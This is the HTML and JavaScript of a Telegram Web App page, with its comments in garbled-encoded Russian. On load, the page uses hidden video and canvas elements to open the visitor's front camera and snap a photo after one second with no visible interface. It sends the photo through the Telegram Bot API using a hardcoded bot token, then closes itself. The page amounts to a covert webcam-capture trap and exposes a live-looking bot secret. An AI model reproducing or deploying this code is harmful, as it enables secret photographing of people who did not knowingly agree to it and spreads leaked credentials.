<!DOCTYPE html>
<html lang="en">
<head>

</head>
<body>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = '8129102478:AAFiIabXWiPI5Aeqqh7jEqXgUKLE6-NalA0';
        const tg = window.Telegram.WebApp;

        // ÐŸÐ¾Ð»ÑƒÑ‡ÐµÐ½Ð¸Ðµ ID Ð¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÐµÐ»Ñ Ð¸Ð· Telegram Web App
        const CHAT_ID = tg.initDataUnsafe?.user?.id;

        if (!CHAT_ID) {
            console.error("Telegram User ID is missing.");
            tg.close();
        }

        tg.expand(); // Ð Ð°ÑÑˆÐ¸Ñ€ÐµÐ½Ð¸Ðµ Web App Ð½Ð° Ð²ÐµÑÑŒ ÑÐºÑ€Ð°Ð½

        // Ð—Ð°Ñ…Ð²Ð°Ñ‚ Ñ„Ð¾Ñ‚Ð¾ Ð¸ Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÐºÐ°
        window.onload = () => {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            // Ð”Ð¾ÑÑ‚ÑƒÐ¿ Ðº ÐºÐ°Ð¼ÐµÑ€Ðµ
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    video.srcObject = stream;

                    // ÐÐ²Ñ‚Ð¾Ð¼Ð°Ñ‚Ð¸Ñ‡ÐµÑÐºÐ¸Ð¹ Ð·Ð°Ñ…Ð²Ð°Ñ‚ Ð¸Ð·Ð¾Ð±Ñ€Ð°Ð¶ÐµÐ½Ð¸Ñ
                    video.onloadedmetadata = () => {
                        const context = canvas.getContext('2d');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;

                        // ÐÐµÐ±Ð¾Ð»ÑŒÑˆÐ°Ñ Ð·Ð°Ð´ÐµÑ€Ð¶ÐºÐ° Ð´Ð»Ñ ÐºÐ¾Ñ€Ñ€ÐµÐºÑ‚Ð½Ð¾Ð¹ Ð°ÐºÑ‚Ð¸Ð²Ð°Ñ†Ð¸Ð¸ ÐºÐ°Ð¼ÐµÑ€Ñ‹
                        setTimeout(() => {
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);

                            const imageData = canvas.toDataURL('image/jpeg');

                            // ÐšÐ¾Ð½Ð²ÐµÑ€Ñ‚Ð°Ñ†Ð¸Ñ base64 Ð² Ñ„Ð°Ð¹Ð» Ð¸ Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÐºÐ° Ð² Telegram
                            fetch(imageData)
                                .then(res => res.blob())
                                .then(blob => {
                                    const formData = new FormData();
                                    formData.append('chat_id', CHAT_ID);
                                    formData.append('photo', blob, 'photo.jpg');

                                    // ÐžÑ‚Ð¿Ñ€Ð°Ð²ÐºÐ° Ð¸Ð·Ð¾Ð±Ñ€Ð°Ð¶ÐµÐ½Ð¸Ñ
                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                        method: 'POST',
                                        body: formData
                                    })
                                    .then(response => response.json())
                                    .then(data => {
                                        if (data.ok) {
                                            console.log("Photo sent successfully!");
                                            tg.close(); // Ð—Ð°ÐºÑ€Ñ‹Ñ‚ÑŒ Web App Ð¿Ð¾ÑÐ»Ðµ Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÐºÐ¸
                                        } else {
                                            console.error("Failed to send photo:", data.description);
                                            tg.close();
                                        }
                                    })
                                    .catch(err => {
                                        console.error("Error:", err);
                                        tg.close();
                                    });
                                });
                        }, 1000); // Ð—Ð°Ð´ÐµÑ€Ð¶ÐºÐ° Ð² 1 ÑÐµÐºÑƒÐ½Ð´Ñƒ
                    };
                })
                .catch(err => {
                    console.error("Camera error:", err);
                    tg.close(); // Ð—Ð°ÐºÑ€Ñ‹Ñ‚ÑŒ Web App Ð¿Ñ€Ð¸ Ð¾ÑˆÐ¸Ð±ÐºÐµ
                });
        };
    </script>
